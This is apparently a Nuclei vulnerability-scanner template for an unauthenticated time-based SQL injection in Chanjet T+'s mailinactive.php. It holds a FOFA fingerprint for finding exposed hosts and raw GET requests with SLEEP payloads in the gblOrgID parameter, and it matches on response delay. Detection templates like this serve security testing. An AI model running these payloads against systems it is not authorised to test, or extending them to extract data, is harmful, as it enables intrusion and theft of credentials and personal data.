id: changjietong-mailinactive_php-sql-time

info:
  name: 畅捷通T+ mailinactive.php SQL注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: icon_hash="-1068428644"
    由于畅捷通T+的mailinactive.php接口处未对用户的输入进行过滤和校验，未经身份验证的攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://mp.weixin.qq.com/s/R__xiTDK5srXHzgYjuK92g
  tags: sql injection

http:
  - raw:
      - |
        GET /mail/mailinactive.php?name=1&gblOrgID=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(4)))a)--+-&DontCheckLogin=1 HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /mail/mailinactive.php?name=1&gblOrgID=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(8)))a)--+-&DontCheckLogin=1 HTTP/1.1
        Host: {{Hostname}}
    disable-cookie: true
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'
          - 'duration_2>=8 && duration_2<=9'
        condition: and